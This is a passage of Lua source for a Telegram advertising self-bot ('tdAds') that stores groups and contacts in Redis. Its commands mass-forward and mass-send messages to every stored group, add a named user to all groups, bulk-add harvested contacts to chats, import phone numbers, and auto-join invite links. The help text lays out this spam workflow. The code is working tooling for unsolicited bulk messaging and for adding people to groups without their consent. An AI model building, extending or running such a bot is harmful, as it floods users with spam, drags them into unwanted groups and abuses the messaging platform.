            local id = msg.reply_to_message_id
            if redis:get("tg:" .. Ads_id .. ":fwdtime") then
              local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 5
              local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 2
              local during = #list / tonumber(max_i) * tonumber(delay)
              send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
              redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
              assert(tdbot_function({
                _ = "forwardMessages",
                chat_id = tonumber(list[1]),
                from_chat_id = msg.chat_id,
                message_ids = {
                  [0] = id
                },
                disable_notification = 1,
                from_background = 1
              }, forwarding, {
                list = list,
                max_i = max_i,
                delay = delay,
                n = 1,
                all = #list,
                chat_id = msg.chat_id,
                msg_id = id,
                s = 0
              }))
            else
              for i, v in pairs(list) do
                assert(tdbot_function({
                  _ = "forwardMessages",
                  chat_id = tonumber(v),
                  from_chat_id = msg.chat_id,
                  message_ids = {
                    [0] = id
                  },
                  disable_notification = 1,
                  from_background = 1
                }, dl_cb, nil))
              end
              return send(msg.chat_id, msg.id, "Send")
            end
          elseif text:match("^([Ss]end)") and 0 < tonumber(msg.reply_to_message_id) then
            function CerNerCompany(CerNer, Company)
              local xt = Company.content.text
              local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
              send(msg.chat_id, msg.id, "waiting ...")
              for k, v in pairs(list) do
                os.execute("sleep " .. tonumber(3))
                tdbot_function({
                  _ = "sendMessage",
                  chat_id = tonumber(v),
                  reply_to_message_id = 0,
                  disable_notification = 0,
                  from_background = 1,
                  reply_markup = nil,
                  input_message_content = {
                    _ = "inputMessageText",
                    text = tostring(xt),
                    disable_web_page_preview = 1,
                    clear_draft = 0,
                    parse_mode = nil,
                    entities = {}
                  }
                }, dl_cb, nil)
              end
              return sendmessage(msg.chat_id, msg.id, "Done\226\153\187\239\184\143")
            end
            tdbot_function({
              _ = "getMessage",
              chat_id = msg.chat_id,
              message_id = msg.reply_to_message_id
            }, CerNerCompany, cmd)
          elseif text:match("^([Ss]end) (.*)") then
            local matches = text:match("^[Ss]end (.*)")
            local dir = redis:smembers("tg:" .. Ads_id .. ":supergroups")
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 5
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 2
            local during = #dir / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = tonumber(dir[1]),
              reply_to_message_id = msg.id,
              disable_notification = 0,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "inputMessageText",
                text = tostring(matches),
                disable_web_page_preview = true,
                clear_draft = false,
                entities = {},
                parse_mode = nil
              }
            }, sending, {
              list = dir,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #dir,
              chat_id = msg.chat_id,
              text = matches,
              s = 0
            }))
          elseif text:match("^([Ll]eft) (.*)$") then
            local matches = text:match("^[Ll]eft (.*)$")
            if matches == "all" then
              for i, v in pairs(redis:smembers("tg:" .. Ads_id .. ":supergroups")) do
                assert(tdbot_function({
                  _ = "changeChatMemberStatus",
                  chat_id = tonumber(v),
                  user_id = bot_id,
                  status = {
                    _ = "chatMemberStatusLeft"
                  }
                }, dl_cb, nil))
              end
            else
              send(msg.chat_id, msg.id, "\216\177\216\168\216\167\216\170 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\174\216\167\216\177\216\172 \216\180\216\175")
              assert(tdbot_function({
                _ = "changeChatMemberStatus",
                chat_id = matches,
                user_id = bot_id,
                status = {
                  _ = "chatMemberStatusLeft"
                }
              }, dl_cb, nil))
              return rem(matches)
            end
          elseif text:match("^([Aa]dd[Tt]o[Aa]ll) @(.*)$") then
            local matches = text:match("^[Aa]dd[Tt]o[Aa]ll @(.*)$")
            local list = {
              redis:smembers("tg:" .. Ads_id .. ":groups"),
              redis:smembers("tg:" .. Ads_id .. ":supergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 5
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 2
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            print(#l)
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = matches
            }, function(I, t)
              if t.id then
                tdbot_function({
                  _ = "addChatMember",
                  chat_id = tonumber(I.list[tonumber(I.n)]),
                  user_id = t.id,
                  forward_limit = 0
                }, adding({
                  list = I.list,
                  max_i = I.max_i,
                  delay = I.delay,
                  n = tonumber(I.n),
                  all = I.all,
                  chat_id = I.chat_id,
                  user_id = I.user_id,
                  s = I.s
                }))
              end
            end, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
          elseif text:match("^([Pp]ing)$") and not msg.forward_info then
            return assert(tdbot_function({
              _ = "forwardMessages",
              chat_id = msg.chat_id,
              from_chat_id = msg.chat_id,
              message_ids = {
                [0] = msg.id
              },
              disable_notification = 0,
              from_background = 1
            }, dl_cb, nil))
          elseif text:match("^([Jj]oin) (.*)$") then
            local matches = text:match("^[Jj]oin (.*)$")
            function joinchannel(extra, tb)
              print(vardump(tb))
              if tb._ == "ok" then
                send(msg.chat_id, msg.id, "Done")
              else
                send(msg.chat_id, msg.id, "failure")
              end
            end
            tdbot_function({
              _ = "importChatInviteLink",
              invite_link = matches
            }, joinchannel, cmd)
          elseif text:match("^([Ss]leep) (%d+)$") then
            local matches = text:match("%d+")
            send(msg.chat_id, msg.id, "bye bye")
            os.execute("sleep " .. tonumber(math.floor(matches) * 60))
            return send(msg.chat_id, msg.id, "hi")
          elseif text:match("^([Hh]elp)$") then
            local txt = [[
Help for TeleGram Advertisin Robot (tdAds)

Info
    statistics and information
 
Promote (user-Id)
    add new moderator
      
Demote (userId)
 remove moderator
      
Send (text)
    send message too all super group;s
    
Fwd {all or sgp or gp or pv} (by reply)
    forward your post to :
    super group or group or private
    
AddedMsg (on or off)
    import contacts by send message
 
SetAddedMsg (text)
    set message when add contact
    
AddToAll @(usename)
    add user or robot to all group's 

AddMembers
    add contact's to group
      
Ls (contact, block, pv, gp, sgp, savelink, goodlink, waitlink, sudo)
    export list of selected item
    
Del (lnk, cotact, sudo)
     delete selected item

Join (on or off)
    set join to link's or don't join
ChkLnk (on or off)
    check link's in terms of valid
and
    Separating healthy and corrupted links

FindLnk (on or off)
    search in group's and find link

Add (phone number)
   add contact by phone number

AddContact (on or off)
    import contact by sharing number

GpMember 1~30000
    set the minimum group members to join

Refresh
    Refresh information

JoinOpenAdd (on or off)
    just join to open add members groups

Join (Private Link)
    Join to Link (channel, gp, ..)

Ping
    test to server connection

Bot @(username)
    Start api bot

Set (Channel-Id)
    set channel for auto forward

Send (by reply)
    send message or channel post with out forward 

Left all
    leave of all group 
You can send command with or with out: 
! or / or # or $ 
before command
     
Publisher @sudo_senator
ZwusChannel @Zeusbotsupport
]]
            return send(msg.chat_id, msg.id, txt)
          elseif text:match("^([Aa]dd) (.*)$") then
            local matches = text:match("^[Aa]dd (.*)$")
            assert(tdbot_function({
              _ = "importContacts",
              contacts = {
                [0] = {
                  _ = "contact",
                  phone_number = tostring(matches),
                  first_name = tostring("Contact "),
                  last_name = tostring("Add"),
                  user_id = 0
                }
              }
            }, cb or dl_cb, nil))
            send(msg.chat_id, msg.id, "Added " .. matches .. " \240\159\147\153")
          elseif tostring(msg.chat_id):match("^-") then
            if text:match("^([Ll]eft)$") then
              rem(msg.chat_id)
              return assert(tdbot_function({
                _ = "changeChatMemberStatus",
                chat_id = msg.chat_id,
                user_id = tonumber(bot_id),
                status = {
                  _ = "chatMemberStatusLeft"
                }
              }, dl_cb, nil))
            elseif text:match("^([Aa]dd[Mm]embers)$") then
              send(msg.chat_id, msg.id, "\216\175\216\177 \216\173\216\167\217\132 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 ...")
              assert(tdbot_function({
                _ = "searchContacts",
                query = nil,
                limit = 2500
              }, function(i, t)
                local users, count = redis:smembers("tg:" .. Ads_id .. ":users"), t.total_count
                for n = 0, tonumber(count) - 1 do
                  assert(tdbot_function({
                    _ = "addChatMember",
                    chat_id = tonumber(i.chat_id),
                    user_id = t.users[n].id,
                    forward_limit = 50
                  }, dl_cb, nil))
                end
                for n = 1, #users do
                  assert(tdbot_function({
                    _ = "addChatMember",
                    chat_id = tonumber(i.chat_id),
                    user_id = tonumber(users[n]),
                    forward_limit = 50
                  }, dl_cb, nil))
                end
              end, {
                chat_id = msg.chat_id
              }))
              return
            end
          end
        end
      elseif msg.content._ == "messageContact" and redis:get("tg:" .. Ads_id .. ":savecontacts") then
        local id = msg.content.contact.user_id
        if not redis:sismember("tg:" .. Ads_id .. ":addedcontacts", id) then
          redis:sadd("tg:" .. Ads_id .. ":addedcontacts", id)
          local first = msg.content.contact.first_name or "-"
          local last = msg.content.contact.last_name or "-"
          local phone = msg.content.contact.phone_number
          local id = msg.content.contact.user_id
          assert(tdbot_function({
            _ = "importContacts",
            contacts_ = {
              [0] = {
                phone_number = tostring(phone),
                first_name = tostring(first),
                last_name = tostring(last),
                user_id = id
              }
            }
          }, dl_cb, nil))
          if redis:get("tg:" .. Ads_id .. ":addcontact") and msg.sender_user_id ~= bot_id then
            local fname = redis:get("tg:" .. Ads_id .. ":fname")
            local lname = redis:get("tg:" .. Ads_id .. ":lname") or ""
            local num = redis:get("tg:" .. Ads_id .. ":num")
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = msg.chat_id,
              reply_to_message_id = msg.id,
              disable_notification = 1,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "inputMessageContact",
                contact = {
                  _ = "contact",
                  phone_number = num,
                  first_name = fname,
                  last_name = lname,
                  user_id = bot_id
                }
              }
            }, dl_cb, nil))
          end
        end
        if redis:get("tg:" .. Ads_id .. ":addmsg") then
          local answer = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "addi bepar pv"
          send(msg.chat_id, msg.id, answer)
        end
      elseif msg.content._ == "messageChatDeleteMember" and msg.content.id == bot_id then
        return rem(msg.chat_id)
      elseif msg.content.caption and redis:get("tg:" .. Ads_id .. ":link") then
        find_link(msg.content.caption)
      end
      assert(tdbot_function({
        _ = "viewMessages",
        chat_id = msg.chat_id,
        message_ids = {
          [0] = msg.id
        }
      }, dl_cb, nil))
    end
  else
  end
end
return redis
